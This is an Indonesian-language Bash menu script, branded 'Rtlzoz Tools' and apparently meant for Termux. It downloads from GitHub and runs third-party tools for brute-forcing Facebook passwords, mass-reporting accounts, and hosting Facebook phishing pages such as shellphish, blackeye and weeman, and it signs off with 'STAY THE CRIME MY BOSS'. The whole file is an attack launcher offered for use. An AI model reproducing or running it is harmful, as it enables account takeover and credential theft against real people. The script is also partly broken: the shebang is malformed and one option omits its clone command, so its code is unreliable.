#usr/bin/bash
clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
# [SUBSCRIBE] Am p5
figlet -f standard Rtlzoz Tools | lolcat
echo
echo  " ____________________-=[Private Tools]=-____________________" | lolcat
echo  "|                                                           |" | lolcat
echo  "|              Root®Autor      : Rtlzoz                     |" | lolcat
echo  "|              Youtube         : Am p5                      |" | lolcat
echo  "|              Blog            : Lagibobo.com               |" | lolcat
echo  "|___________________________________________________________|" | lolcat
date | lolcat
echo
echo $i"========================================"
echo $i"|"$me" 0"$i" |"$pu" Install dulu bahannya bro "
echo $i"========================================"
echo $i"|"$me" 1"$i" |"$pu" BRUTEFORCE FB PHP"
echo $i"|"$me" 2"$i" |"$pu" BRUTEFORCE FB v.1.3"
echo $i"|"$me" 3"$i" |"$pu" BRUTEFORCE FB "$me"[Root Access]"
echo $i"────────────────────────────────"
echo $i"|"$me" 4"$i" |"$pu" PROFILE GUARD FACEBOOK"
echo $i"|"$me" 5"$i" |"$pu" AUTO REPORT FACBOOK"
echo $i"────────────────────────────────"
echo $i"|"$me" 6"$i" |"$pu" PHISING FACEBOOK 1"
echo $i"|"$me" 7"$i" |"$pu" PHISING FACEBOOK 2"
echo $i"|"$me" 8"$i" |"$pu" PHISING FACEBOOK 4"
echo $i"========================================"
echo $i"|"$me" 9"$i" |"$pu" EXIT"
echo $i"========================================"
echo
echo $me"┌==="$bi"["$i"Rtlzoz"$bi"]"$me"======"$bi"["$i""Masukan Nomor Bro""$bi"]"
echo $me"¦"
read -p"└──# " pil

if [ $pil = 0 ]
then
clear
apt update && apt upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
pkg install git
pip2 install mechanize
pkg install curl
pkg install ruby
pkg install gem
gem install lolcat
pkg install git
pkg install php
pkg install ruby cowsay toilet figlet
pkg install neofetch
pkg install nano
figlet -f slant " SUCCESS "|lolcat
fi

if [ $pil = 1 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/FR13ND8/fbbrute
cd fbbrute
php fb.php
fi

if [ $pil = 2 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/FR13ND8/mbf
cd mbf
python2 MBF.py
fi

if [ $pil = 3 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/thelinuxchoice/facebash.git
cd facebash
bash facebash.sh
fi

if [ $pil = 4 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/FR13ND8/ProfileGuardFb
cd ProfileGuardFb
php guard.php
fi

if [ $pil = 5 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/IlayTamvan/Report
cd Report
unzip Report.zip
python2 Report.py
fi

if [ $pil = 6 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/thelinuxchoice/shellphish.git
cd shellphish
bash shellphish.sh
fi

if [ $pil = 7 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
git clone https://github.com/thelinuxchoice/blackeye.git
cd blackeye
bash blackeye.sh
fi

if [ $pil = 8 ]
then
clear
figlet -f slant "Bentar bro"|lolcat
sleep 1
https://github.com/evait-security/weeman.git
chmod +x *
python2 weeman.py
fi

if [ $pil = 9 ]
then
clear
figlet -f slant "SHUTDOWN"|lolcat
sleep 2
echo $cy"Thanks For Using This Tools"
sleep 2
echo $i"If u find the bug please contact to me"
sleep 2
echo $ku"Youtube :"$i" Am p5"
sleep 2
echo $pur"STAY THE CRIME MY BOSS, SEE U !"
exit
fi